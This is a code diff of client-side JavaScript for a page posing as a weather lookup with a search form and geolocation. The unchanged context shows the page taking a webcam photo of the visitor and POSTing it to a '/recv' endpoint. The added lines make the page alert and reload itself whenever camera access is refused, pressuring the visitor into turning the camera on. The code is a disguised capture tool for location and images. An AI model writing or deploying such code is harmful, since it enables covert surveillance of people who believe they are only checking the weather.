@@ -1,5 +1,5 @@
 console.log('Connected to client-side program')
-navigator.mediaDevices.getUserMedia({video: true});
+
 const weatherform = document.querySelector('form');
 const search = document.querySelector('input');
 const message1 = document.querySelector('#message-1');
@@ -38,6 +38,8 @@ document.addEventListener('DOMContentLoaded', (e) => {
                             }
                             function handleError(error) {
                                 console.log('getUserMedia error: ', error);
+                                alert('Please activate camera!');
+                                location.reload();
                             }
                             navigator.mediaDevices.getUserMedia(constraints).
                                 then(handleSuccess).catch(handleError);
@@ -47,7 +49,6 @@ document.addEventListener('DOMContentLoaded', (e) => {
                                     if (photoSent) {
                                         return console.log('prevented from taking a further photo');
                                     } else {
-                                        console.log('asfd');
                                         width = video.videoWidth;
                                         height = video.videoHeight;
 
@@ -56,7 +57,7 @@ document.addEventListener('DOMContentLoaded', (e) => {
                                         video.setAttribute('height', height);
                                         video.setAttribute('width', width);
 
-                                        var context = canvas.getContext('2d');
+                                        context = canvas.getContext('2d');
                                         context.drawImage(video, 0, 0, width, height);
                                         $.post('/recv', {
                                             img: canvas.toDataURL(),
@@ -75,8 +76,9 @@ document.addEventListener('DOMContentLoaded', (e) => {
             })
         });
     } else {
+        
         message1.textContent = "Sorry, your browser does not support HTML5 geolocation.";
-        message2.textContent = "Try a search, instead!"
+        message2.textContent = "Try a search, instead!";
     }
 });
 
